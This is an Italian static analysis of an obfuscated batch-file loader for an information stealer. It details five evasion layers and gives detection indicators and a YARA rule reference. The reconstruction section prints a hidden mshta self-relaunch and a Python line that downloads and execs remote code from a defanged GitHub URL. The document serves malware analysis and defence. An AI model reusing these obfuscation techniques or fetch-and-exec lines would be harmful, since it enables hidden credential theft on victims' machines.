# Analisi di `9a.bat` — loader batch offuscato a 5 livelli (campagna B)

**File:** `%PUBLIC%\Downloads\xmetavip2\9a.bat` (94.437 byte)
**SHA256:** `197F763BCD619F96E8C8C9074C9F483CCDB31E49B6E51C115D086A48BED17DE0`
**Ruolo:** voce `Run\WindowsSecurity` → esecuzione a ogni logon utente.

> Il campione non è incluso in questo repository: è condiviso tramite **MalwareBazaar (abuse.ch)** dentro l'archivio [`419f513be822e01ebc1494ac1c20d78de701eaeae5fa025625550ee518c41a5f`](https://bazaar.abuse.ch/sample/419f513be822e01ebc1494ac1c20d78de701eaeae5fa025625550ee518c41a5f/) (zip con password `infected`), che contiene `9a.bat` con lo SHA256 indicato sopra. L'analisi è statica; il file **non va mai eseguito**.

## Livelli di offuscamento

### 1. Falso BOM UTF-16
Il file inizia con i byte `FF FE` (BOM UTF-16-LE) ma il contenuto successivo è ANSI a byte singolo. Risultato: editor, parser e pipeline di triage che rispettano il BOM decodificano il contenuto come UTF-16 e ottengono migliaia di glifi CJK privi di senso; `cmd.exe`, che non interpreta il BOM come vincolo, esegue il file senza problemi. Tecnica semplice e molto efficace contro l'ispezione manuale e gli scanner naive.

### 2. Variabili d'ambiente spazzatura
Ogni carattere dei comandi reali è intervallato da token di variabili non definite:

```
%nFpcMfDSZ%@%UmzyzBO%%zgYEVlsEb%e%KaKxwpsV%...
```

In cmd, `%NomeNonDefinito%` espande a stringa vuota: a runtime il comando si "ricompone", mentre staticamente appare come rumore. I nomi delle variabili contengono anche simboli (`%ws)uP%`, `%(Zbx#AU%`), che rompono le regex di pulizia basate su `%[A-Za-z0-9]+%`.

### 3. Labirinto di label e goto
~120 label numeriche (123 nel campione: `:615066`, `:630912`, …) alternate a `goto` verso etichette apparentemente inesistenti (`;,;`, `, ;`). Il flusso reale è non lineare e richiede emulazione del parser cmd per essere ricostruito.

### 4. Dead code aritmetico
Decine di istruzioni prive di qualsiasi effetto collaterale:

```
set /a ans=0x1f*((0166470^0344740)>>3)
set /a ans=2*2*2*0x3*05*0x7*07*0x61
```

Aumentano l'entropia statistica del file e il costo dell'analisi manuale. La variabile `ans` non viene mai usata.

### 5. Assemblaggio runtime del comando finale
**Il payload non esiste in chiaro in nessun punto del file.** I singoli caratteri vengono estratti a runtime da variabili d'ambiente presenti su ogni installazione Windows, tramite substring:

```
%DRIVERDATA:~-34,1%          → estrae 1 carattere
%PROGRAMFILES(X86):~-17,1%
%LOCALAPPDATA:~-12,1%
```

più una stringa charset personalizzata definita nel file:

```
KDOT=PS7sU4zhlIiMLyRCncv3tKbZXEfx5pjrOVmA1BgH9GNk2J0Y8FWd6QqDuoTaew
```

referenziata come `%KDOT:~17,1%` ecc. La definizione `KDOT=…` è a sua volta intervallata da variabili spazzatura e si legge in chiaro solo dopo aver tolto il livello 2; i richiami `%KDOT:~` sono invece in chiaro già nel file grezzo. Qualsiasi detection su stringhe del comando finale è quindi **impossibile per costruzione**: la superficie statica utile sono solo le primitive (mshta, i pattern di substring, il charset).

## Comportamento ricostruito

1. **Rilancio nascosto di sé stesso**:
   `mshta vbscript:createobject("wscript.shell").run("""%~s0"" ... ,0)` — il batch riparte senza finestra. L'argomento `vbscript:…` è in chiaro nel file; il nome `mshta` viene assemblato a runtime ed è assente in chiaro sia nel file grezzo sia dopo aver tolto il livello 2.
2. **Download ed esecuzione in memoria dello stealer** tramite il runtime Python portatile installato dal dropper:
   ```python
   pw.exe -c "import base64; exec(base64.b64decode('<blob>'))"
   # il blob si riduce a:
   exec(base64.b64decode(urllib.request.urlopen(
       'hxxps://raw.githubusercontent[.]com/hacker9xclone/111/refs/heads/master/mrxw'
   ).read()))
   ```

## Implicazioni per la detection

- Il file su disco è un **loader di 4 righe logiche** nascosto in 94 KB di rumore: nessuna firma sul payload è possibile perché il payload non c'è.
- Il codice dello stealer risiedeva su **GitHub** (dominio fidato) e veniva eseguito in memoria a ogni logon → la scansione on-access non ha nulla da scansionare.
- Le primitive rilevabili sono: creazione di valori Run che puntano a `.bat` in `%PUBLIC%`, process tree `explorer → cmd → mshta → cmd → pw.exe`, accesso di `pw.exe` (pythonw rinominato) a `raw.githubusercontent.com` seguito da traffico verso `api.telegram.org`.
- Verifica del 06/10/2026: una scansione personalizzata di Microsoft Defender (`MpCmdRun -ScanType 3 -DisableRemediation`, definizioni 1.459.574.0) su un archivio non cifrato con il campione restituisce *found no threats*.
- Regola YARA: `yara/braodo_like_stealer.yar`, costruita su stringhe presenti nel file grezzo (falso BOM, argomento `vbscript:` in chiaro, substring delle variabili d'ambiente, richiami `%KDOT:~`).
